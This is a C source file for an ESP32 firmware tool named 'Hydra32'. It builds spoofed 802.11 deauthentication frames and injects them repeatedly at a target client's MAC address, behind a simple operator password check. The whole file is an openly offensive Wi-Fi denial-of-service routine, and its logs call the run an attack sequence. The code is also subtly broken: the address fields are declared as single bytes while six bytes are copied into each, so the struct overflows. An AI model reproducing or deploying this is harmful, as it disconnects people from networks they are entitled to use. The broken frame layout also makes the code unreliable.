#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "wifi_testing.h"

static const char *TAG = "Hydra32_Engine";

// Standard 802.11 Deauthentication Frame Structure
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1; // Destination address (Target Client)
    uint8_t  addr2; // Source address (Spoofed AP)
    uint8_t  addr3; // BSSID (Access Point ID)
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) wifi_deauth_frame_t;

// Verify UI Operator Password
int authenticate_operator(const char *input_password) {
    if (strcmp(input_password, PASS_KEY) == 0) {
        ESP_LOGI(TAG, "Access Granted: Operator authorized successfully.");
        return 1;
    }
    ESP_LOGW(TAG, "Access Denied: Invalid password attempt.");
    return 0;
}

// Core Raw Packet Injection Operation
esp_err_t hydra32_inject_deauth(const hydra32_config_t *config) {
    if (config == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    wifi_deauth_frame_t frame;
    
    // Construct 802.11 Deauth management frame (Subtype: 0xC0)
    frame.frame_control = 0x00C0; 
    frame.duration = 0x0000;
    memcpy(frame.addr1, config->target_mac, 6);
    memcpy(frame.addr2, config->ap_mac, 6);
    memcpy(frame.addr3, config->ap_mac, 6);
    frame.seq_ctrl = 0x0000;
    frame.reason_code = 0x0007; // Reason: Class 3 frame received from nonassociated STA

    ESP_LOGI(TAG, "Hydra32 Launching Injection: %d frames via native raw layer", config->frame_count);

    for (int i = 0; i < config->frame_count; i++) {
        // Native ESP32 Raw 802.11 Transmission API
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), false);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Injection interrupted at frame %d: %s", i, esp_err_to_name(err));
            return err;
        }
        // User configured dynamic delay
        vTaskDelay(pdMS_TO_TICKS(config->delay_ms > 0 ? config->delay_ms : 100));
    }

    ESP_LOGI(TAG, "Hydra32 Attack sequence successfully finished.");
    return ESP_OK;
}
